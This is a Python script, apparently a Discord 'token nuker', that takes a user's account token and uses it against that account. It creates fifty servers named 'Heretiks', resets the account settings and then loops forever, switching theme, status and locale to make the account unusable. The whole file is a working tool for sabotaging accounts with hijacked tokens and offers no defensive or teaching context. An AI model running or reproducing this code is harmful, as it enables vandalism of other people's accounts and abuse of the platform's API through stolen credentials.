import requests, json, random, numpy, datetime, ctypes, aiohttp
from colorama import Fore
from itertools import cycle

def token_termination(token):
    locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
    ]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ch",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': "https://cdn.discordapp.com/channel-icons/840101092624826369/59f91312fcd0d09babe16e9faf55fbc6.webp",
        'name': "Heretiks",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v9/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v9/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v9/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break   

def __init__():
    token = input(str(Fore.RED + "[ Token ] " + Fore.CYAN + "Please enter the token: "))
    if token == "":
        print(Fore.RED + "[ERROR]" + Fore.CYAN + " Token cannot be nothing.")
        __init__()
    else:
        print(Fore.RED + "[ Process ]" + Fore.CYAN + " Token Termination process started.")
        token_termination(token)

__init__()
